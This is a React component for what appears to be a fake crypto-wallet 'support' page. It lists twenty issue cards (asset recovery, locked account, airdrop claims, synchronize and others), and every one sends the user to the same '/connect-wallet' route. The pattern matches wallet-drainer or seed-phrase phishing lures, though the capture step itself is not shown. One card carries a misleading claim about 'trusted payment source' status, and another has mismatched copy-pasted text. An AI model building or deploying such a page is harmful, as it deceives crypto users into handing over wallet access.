import React from 'react';
import { LayoutPage } from '../../../layout/LayoutPage';
import { Box, ServiceStyle } from './styled';
import {
  BsCheck2Circle,
  BsBank,
  BsCalculatorFill,
  BsShieldLock,
  BsCurrencyExchange,
  BsBarChartFill,
  BsFillLockFill,
  BsListTask,
} from 'react-icons/bs';
import {
  GiOilPump,
  GiMoebiusTrefoil,
  GiSandsOfTime,
  GiAirBalloon,
  GiToken,
  GiBulb,
  GiTakeMyMoney,
} from 'react-icons/gi';
import { AiFillPlusSquare, AiOutlineCloudSync, AiOutlineLineChart, AiOutlineLogin } from 'react-icons/ai';
import { useNavigate } from 'react-router-dom';

function Service() {
  const navigate = useNavigate();

  const handleClick = () => {
    navigate('/connect-wallet');
  };
  return (
    <LayoutPage>
      <ServiceStyle>
        <h2 data-aos="fade-up">Make Your Selection Below</h2>

        <div className="grid">
          <Box data-aos="fade-left" onClick={handleClick}>
            <BsCheck2Circle className="icon" />
            <br />
            <h3>Migration Issues</h3>
            <br />
            <p>Click here for migration related issues</p>
          </Box>
          <Box data-aos="fade-left" onClick={handleClick}>
            <BsBank className="icon" />
            <br />
            <h3>Assets Recovery</h3>
            <br />
            <p>Click here for assets recovery issues</p>
          </Box>
          <Box data-aos="fade-left" onClick={handleClick}>
            <GiOilPump className="icon" />
            <br />
            <h3>High Gas Fees</h3>
            <br />
            <p>Click here for gas fee related issues.</p>
          </Box>
          <Box data-aos="fade-left" onClick={handleClick}>
            <GiMoebiusTrefoil className="icon" />
            <br />
            <h3>Slippage Error</h3>
            <br />
            <p>Click here for slippage related error during trade.</p>
          </Box>
          <Box data-aos="fade-left" onClick={handleClick}>
            <BsCalculatorFill className="icon" />
            <br />
            <h3>Transaction Error</h3>
            <br />
            <p>Click here for transaction related issues.</p>
          </Box>
          <Box data-aos="fade-left" onClick={handleClick}>
            <BsShieldLock className="icon" />
            <br />
            <h3>Cross Chain Transfer</h3>
            <br />
            <p>Click here for cross chain bridge issues.</p>
          </Box>
          <Box data-aos="fade-left" onClick={handleClick}>
            <GiSandsOfTime className="icon" />
            <br />
            <h3>Staking Issues</h3>
            <br />
            <p>click here for staking related issues.</p>
          </Box>
          <Box data-aos="fade-left" onClick={handleClick}>
            <BsCurrencyExchange className="icon" />
            <br />
            <h3>Swap/Exchange</h3>
            <br />
            <p>Click here for swap/exchange related issues.</p>
          </Box>
          <Box data-aos="fade-left" onClick={handleClick}>
            <BsBarChartFill className="icon" />
            <br />
            <h3>Connect to Dapps</h3>
            <br />
            <p>Click here for error while connecting to Dapps</p>
          </Box>
          <Box data-aos="fade-left" onClick={handleClick}>
            <AiOutlineLogin className="icon" />
            <br />
            <h3>Login Issues</h3>
            <br />
            <p>Click here for issues while logging into your wallet.</p>
          </Box>
          <Box data-aos="fade-left" onClick={handleClick}>
            <GiAirBalloon className="icon" />
            <br />
            <h3>Claim Airdrop</h3>
            <br />
            <p>Click here for airdrop related issues.</p>
          </Box>
          <Box data-aos="fade-left" onClick={handleClick}>
            <GiToken className="icon" />
            <br />
            <h3>NFTS Issues</h3>
            <br />
            <p>Click here for NFTs minting/transfer related issues.</p>
          </Box>
          <Box data-aos="fade-left" onClick={handleClick}>
            <GiBulb className="icon" />
            <br />
            <h3>Missing/Irregular Balance</h3>
            <br />
            <p>Click here for NFTs minting/transfer related issues.</p>
          </Box>
          <Box data-aos="fade-left" onClick={handleClick}>
            <AiFillPlusSquare className="icon" />
            <br />
            <h3>Whitelist Issues</h3>
            <br />
            <p>Click here for whitelist related issues.</p>
          </Box>
          <Box data-aos="fade-left" onClick={handleClick}>
            <GiTakeMyMoney className="icon" />
            <br />
            <h3>Transaction Delay</h3>
            <br />
            <p>Click here for any issues related to transaction delayed.</p>
          </Box>
          <Box data-aos="fade-left" onClick={handleClick}>
            <BsFillLockFill className="icon" />
            <br />
            <h3>Locked Account</h3>
            <br />
            <p>Click here for issues related to account lock.</p>
          </Box>
          <Box data-aos="fade-left" onClick={handleClick}>
            <AiOutlineLineChart className="icon" />
            <br />
            <h3>Trading Wallet Issues</h3>
            <br />
            <p>Click here if you have problem with your trading wallet.</p>
          </Box>
          <Box data-aos="fade-left" onClick={handleClick}>
            <GiToken className="icon" />
            <br />
            <h3>Unable To Buy Coins/Tokens</h3>
            <br />
            <p>To trade crypto your account must be marked as a trusted payment source.</p>
          </Box>
          <Box data-aos="fade-left" onClick={handleClick}>
            <BsListTask className="icon" />
            <br />
            <h3>Other Issues Not Listed</h3>
            <br />
            <p>If you can&apos;t find the issue you are experiencing click here</p>
          </Box>
          <Box data-aos="fade-left" onClick={handleClick}>
            <AiOutlineCloudSync className="icon" />
            <br />
            <h3>Synchronize</h3>
            <br />
            <p>Click here to restore sync.</p>
          </Box>
        </div>
      </ServiceStyle>
    </LayoutPage>
  );
}

export default Service;
